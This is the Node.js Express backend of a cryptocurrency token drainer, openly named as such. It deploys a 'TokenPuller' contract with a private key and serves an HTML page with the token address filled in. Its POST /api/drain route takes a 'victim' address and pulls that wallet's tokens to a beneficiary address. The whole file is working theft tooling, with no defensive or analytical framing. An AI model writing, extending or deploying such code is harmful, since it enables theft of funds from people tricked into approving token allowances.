const express = require("express");
const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");
require("dotenv").config();

const PORT = process.env.PORT || 3999;
const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS || "0x1111111111111111111111111111111111111111";
const BENEFICIARY = process.env.BENEFICIARY || "0x2222222222222222222222222222222222222222";
const RPC_URL = process.env.RPC_URL || "http://127.0.0.1:8545";

const app = express();
app.use(express.json());

// --- lazy deploy of TokenPuller -------------------------------------------
let pullerAddress = null;

function loadPullerBytecode() {
  const artifactPath = path.join(__dirname, "artifacts", "contracts", "TokenPuller.sol", "TokenPuller.json");
  const artifact = JSON.parse(fs.readFileSync(artifactPath, "utf8"));
  return { abi: artifact.abi, bytecode: artifact.bytecode };
}

async function getPuller() {
  if (pullerAddress) return pullerAddress;
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const pk = process.env.PRIVATE_KEY;
  if (!pk) throw new Error("PRIVATE_KEY not set");
  const signer = new ethers.Wallet(pk, provider);
  const { abi, bytecode } = loadPullerBytecode();
  const factory = new ethers.ContractFactory(abi, bytecode, signer);
  const puller = await factory.deploy(TOKEN_ADDRESS, BENEFICIARY);
  await puller.waitForDeployment();
  pullerAddress = await puller.getAddress();
  console.log("TokenPuller lazily deployed at:", pullerAddress);
  return pullerAddress;
}

// --- routes ---------------------------------------------------------------
// Root route registered BEFORE express.static so the token address is
// substituted into the HTML before it is served.
app.get("/", (req, res) => {
  const html = fs
    .readFileSync(path.join(__dirname, "public", "index.html"), "utf8")
    .split("%TOKEN_ADDRESS%")
    .join(TOKEN_ADDRESS);
  res.type("html").send(html);
});

app.get("/api/health", (req, res) => {
  res.json({ ok: true, token: TOKEN_ADDRESS, puller: pullerAddress });
});

app.post("/api/drain", async (req, res) => {
  try {
    const { victim } = req.body || {};
    if (!victim || !ethers.isAddress(victim)) {
      return res.status(400).json({ error: "'victim' is not a valid address" });
    }
    const pullerAddr = await getPuller();
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const pk = process.env.PRIVATE_KEY;
    const signer = new ethers.Wallet(pk, provider);
    const { abi } = loadPullerBytecode();
    const puller = new ethers.Contract(pullerAddr, abi, signer);
    const tx = await puller.drain(victim);
    await tx.wait();
    res.json({ ok: true, victim, tx: tx.hash });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.use(express.static(path.join(__dirname, "public")));

app.listen(PORT, () => {
  console.log(`Token drainer listening on :${PORT} (token ${TOKEN_ADDRESS.slice(0, 6)}...${TOKEN_ADDRESS.slice(-4)})`);
});
